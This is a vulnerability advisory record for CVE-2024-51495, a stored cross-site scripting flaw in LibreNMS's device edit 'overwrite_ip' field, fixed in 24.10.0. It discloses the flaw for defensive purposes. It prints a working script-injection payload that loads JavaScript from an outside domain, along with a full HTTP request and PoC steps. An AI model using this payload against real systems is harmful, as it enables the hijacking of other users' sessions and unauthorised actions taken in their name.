advisory_id: GHSA-p66q-ppwr-q5j8
datasource_id: github_osv_importer_v2/GHSA-p66q-ppwr-q5j8
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-p66q-ppwr-q5j8/GHSA-p66q-ppwr-q5j8.json
aliases:
  - CVE-2024-51495
summary: |
  LibreNMS has a Stored XSS ('Cross-site Scripting') in librenms/includes/html/dev-overview-data.inc.php
  ### Summary

  A Stored Cross-Site Scripting (XSS) vulnerability in the Device Overview page allows authenticated users to inject arbitrary JavaScript through the "overwrite_ip" parameter when editing a device. This vulnerability results in the execution of malicious code when the device overview page is visited, potentially compromising the accounts of other users.

  ### Details

  The vulnerability occurs when editing a device. An attacker can inject arbitrary JavaScript into the "overwrite_ip" parameter. This malicious script is then executed in the "Assigned IP" field when the device overview page is loaded.

  The payload used to exploit this vulnerability is: `test'"><script src=//15.rs></script>`

  Note: The payload uses the "15.rs" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.

  The root cause of this vulnerability is the application's failure to properly sanitize the "overwrite_ip" value before including it in the HTML output. This is evident in the following line of code:

  https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/dev-overview-data.inc.php#L42

  ### PoC

  1. Edit a device and use the following payload in the "overwrite_ip" parameter: `test'"><script src=//15.rs></script>`
  2. Save the changes.
  3. Navigate to the device overview page.
  4. Observe that the injected script executes in the "Assigned IP" field.

  ```http
  POST /device/14/edit HTTP/1.1
  Host: <your_host>
  Content-Type: application/x-www-form-urlencoded
  Cookie: <your_cookie>

  _token=<your_token>&editing=yes&display=&overwrite_ip=test'"><script+src=//15.rs></script>&descr=&type=&parent_id%5B%5D=15&Submit=
  ```

  ### Impact

  This vulnerability allows authenticated users to execute arbitrary JavaScript code in the context of other users' sessions. Compromised accounts could lead to unauthorized actions being taken on behalf of the impacted users.
impacted_packages:
  - purl: pkg:composer/librenms/librenms
    affected_versions: vers:composer/<=24.9.1
    fixed_versions: vers:composer/24.10.0
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-p66q-ppwr-q5j8/GHSA-p66q-ppwr-q5j8.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-79
references:
  - url: https://github.com/librenms/librenms
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/commit/4568188ce9097a2e3a3b563311077f2bb82455c0
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/security/advisories/GHSA-p66q-ppwr-q5j8
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-51495
    reference_type:
    reference_id: CVE-2024-51495
